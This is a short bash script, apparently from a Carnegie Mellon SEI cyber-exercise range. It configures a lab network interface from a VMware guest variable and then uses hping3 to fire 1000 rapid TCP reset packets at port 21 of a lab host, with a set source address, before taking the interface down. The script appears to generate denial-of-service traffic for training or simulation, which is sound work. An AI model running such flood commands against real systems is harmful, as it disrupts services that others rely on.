#!/bin/bash

# Copyright 2025 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


dosip=$(vmtoolsd --cmd "info-get guestinfo.dosip")

ip link set dev ens34 up
ip addr flush dev ens34
ip addr replace 123.45.67.$dosip/24 dev ens34
sleep 5

sudo hping3 -R -p 21 -i u5000 --c 1000 -a 123.45.67.$dosip 123.45.67.89
sleep 2

ip addr flush dev ens34
ip link set dev ens34 down

